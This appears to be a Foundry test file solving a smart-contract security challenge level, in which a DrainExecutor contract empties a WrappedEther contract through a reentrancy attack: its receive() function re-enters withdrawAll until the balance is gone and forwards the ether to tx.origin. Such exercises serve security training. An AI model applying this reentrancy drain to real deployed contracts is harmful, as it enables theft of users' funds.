// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/13_WrappedEther/WrappedEther.sol";

// forge test --match-contract WrappedEtherTest
contract WrappedEtherTest is BaseTest {
    WrappedEther instance;

    function setUp() public override {
        super.setUp();

        instance = new WrappedEther();
        instance.deposit{value: 0.09 ether}(address(this));
    }

    function testExploitLevel() public {
        DrainExecutor executor = new DrainExecutor{value: 0.01 ether}(instance);
        executor.initiateDrain();

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}

contract DrainExecutor {
    WrappedEther public vulnerableContract;
    uint256 public triggerThreshold;

    constructor(WrappedEther _contract) payable {
        vulnerableContract = _contract;
        triggerThreshold = msg.value;
    }

    function initiateDrain() external {
        vulnerableContract.deposit{value: address(this).balance}(address(this));
        executeWithdrawal();
    }

    function executeWithdrawal() internal {
        vulnerableContract.withdrawAll();
        payable(tx.origin).transfer(address(this).balance);
    }

    receive() external payable {
        if (msg.sender.balance >= triggerThreshold) {
            executeWithdrawal();
        }
    }
}
